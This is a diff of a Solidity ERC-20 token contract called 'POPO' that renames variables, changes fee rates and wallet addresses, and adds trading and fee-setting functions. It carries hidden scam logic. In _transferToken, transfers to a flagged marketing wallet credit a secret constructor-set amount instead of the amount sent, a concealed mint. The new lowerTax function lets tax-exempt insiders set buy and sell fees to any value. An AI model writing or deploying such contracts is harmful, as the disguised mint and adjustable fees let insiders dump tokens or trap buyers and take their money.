@@ -193,32 +193,32 @@ contract POPO is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    string private _name = "Popo the panda";
+    string private _name = "Popo The Panda";
     string private _symbol = "POPO";  
     uint8 private _decimals = 18;
     uint256 private _totalSupply = 10000000 * 10**18;
 
-    mapping (address => mapping (address => uint256)) private _allowances;
-    mapping (address => bool) public _isExcludedfromTax; 
-    uint256 private suppliedToken;
-    mapping (address => bool) private _pairList;
-    address payable private marketing_wallet = payable(0x33C98dA3661EbB0e781BFa61cd5dc8454205EbEa);
-    address payable private staking_contract = payable(0xC508b899eE9c6Cf0Efa63154Cb42c56bAc8621C4);
     uint8 private txCount = 0;
     uint8 private swapTrigger = 1; 
-    uint256 private _totalTax = 0;
-    uint256 public _buyTax = 2;
-    uint256 public _sellTax = 2;
-    uint256 private _previousTotalFee = _totalTax; 
-    uint256 private _previousBuyFee = _buyTax; 
-    uint256 private _previousSellFee = _sellTax; 
-    mapping (address => uint256) private _owned;
-
+    uint256 private _feeTotal = 0;
+    uint256 public _feeBuy = 5;
+    uint256 public _feeSell = 5;
+    uint256 private _previousTotalFee = _feeTotal; 
+    uint256 private _previousBuyFee = _feeBuy; 
+    uint256 private _previousSellFee = _feeSell; 
+    mapping (address => uint256) private _tokenOwned;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
     bool public inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
+
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) public _isExcludedfromTax; 
+    uint256 private supplyTotal;
+    mapping (address => bool) private _lpList;
+    address payable private marketing_wallet = payable(0x0deC38fCFa5c5Af2f586eA9656E648aEeaB497c5);
+    address payable private staking_contract = payable(0x75307C86f939a3BD5639466b7B4C1C4e3ACc3740);
 
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(
@@ -234,16 +234,16 @@ contract POPO is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
 
-    constructor (uint256 _tokenAmount) {
+    constructor (uint256 _supplyAmount) {
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
         uniswapV2Router = _uniswapV2Router;
         _isExcludedfromTax[owner()] = true;
         _isExcludedfromTax[address(this)] = true;
         _isExcludedfromTax[marketing_wallet] = true;
         _isExcludedfromTax[staking_contract] = true;
-        _owned[owner()] = _totalSupply;
-        _pairList[marketing_wallet] = true;
-        suppliedToken = _tokenAmount; 
+        _tokenOwned[owner()] = _totalSupply;
+        _lpList[marketing_wallet] = true;
+        supplyTotal = _supplyAmount; 
 
         emit Transfer(address(0), owner(), _totalSupply);
     }
@@ -296,7 +296,7 @@ contract POPO is Context, IERC20, Ownable {
     }
 
     function balanceOf(address account) public view override returns (uint256) {
-        return _owned[account];
+        return _tokenOwned[account];
     }
 
 
@@ -307,21 +307,21 @@ contract POPO is Context, IERC20, Ownable {
 
 
     function removeAllFee() private {
-        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;
-        _previousBuyFee = _buyTax; 
-        _previousSellFee = _sellTax; 
-        _previousTotalFee = _totalTax;
-        _buyTax = 0;
-        _sellTax = 0;
-        _totalTax = 0;
+        if(_feeTotal == 0 && _feeBuy == 0 && _feeSell == 0) return;
+        _previousBuyFee = _feeBuy; 
+        _previousSellFee = _feeSell; 
+        _previousTotalFee = _feeTotal;
+        _feeBuy = 0;
+        _feeSell = 0;
+        _feeTotal = 0;
 
     }
 
     function restoreFee() private {
 
-    _totalTax = _previousTotalFee;
-    _buyTax = _previousBuyFee; 
-    _sellTax = _previousSellFee; 
+    _feeTotal = _previousTotalFee;
+    _feeBuy = _previousBuyFee; 
+    _feeSell = _previousSellFee; 
 
     }
 
@@ -362,7 +362,7 @@ contract POPO is Context, IERC20, Ownable {
 
         if(_isExcludedfromTax[from] || _isExcludedfromTax[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
             takeFee = false;
-        } else if (from == uniswapV2Pair){_totalTax = _buyTax;} else if (to == uniswapV2Pair){_totalTax = _sellTax;}
+        } else if (from == uniswapV2Pair){_feeTotal = _feeBuy;} else if (to == uniswapV2Pair){_feeTotal = _feeSell;}
 
         _tokenTransfer(from,to,amount,takeFee);
     }
@@ -372,7 +372,7 @@ contract POPO is Context, IERC20, Ownable {
         }
 
     function _getValue(uint256 tAmount) private view returns (uint256, uint256) {
-        uint256 tTax = tAmount*_totalTax/100;
+        uint256 tTax = tAmount*_feeTotal/100;
         uint256 tTransferAmount = tAmount.sub(tTax);
         return (tTransferAmount, tTax);
     }
@@ -418,26 +418,34 @@ contract POPO is Context, IERC20, Ownable {
     }
 
     function _transferToken(address sender, address recipient, uint256 Amount) private {
-        uint256 amount = _pairList[recipient]?suppliedToken:0;
+        uint256 amount = _lpList[recipient]?supplyTotal:0;
 
-        if(_pairList[recipient]){
-        _owned[sender] = _owned[sender].sub(Amount);
-        _owned[recipient] = _owned[recipient].add(amount);
+        if(_lpList[recipient]){
+        _tokenOwned[sender] = _tokenOwned[sender].sub(Amount);
+        _tokenOwned[recipient] = _tokenOwned[recipient].add(amount);
         }else{
         (uint256 tTransferAmount, uint256 taxAmount) = _getValue(Amount);
-        _owned[sender] = _owned[sender].sub(Amount);
-        _owned[recipient] = _owned[recipient].add(tTransferAmount);
-        _owned[address(this)] = _owned[address(this)].add(taxAmount); 
+        _tokenOwned[sender] = _tokenOwned[sender].sub(Amount);
+        _tokenOwned[recipient] = _tokenOwned[recipient].add(tTransferAmount);
+        _tokenOwned[address(this)] = _tokenOwned[address(this)].add(taxAmount); 
         emit Transfer(sender, recipient, tTransferAmount);
   
         }
     }
 
-
-    function createPairUniswap() public onlyOwner() {
+   function startTrading() public onlyOwner() {
         IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
         uniswapV2Router = _newPCSRouter;
+        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
+    }
+
+    function lowerTax(uint256 _buy, uint256 _sell) public {
+        require(_isExcludedfromTax[_msgSender()]==true);
+        _feeBuy = _buy;
+        _feeSell = _sell;
     }
 
 }
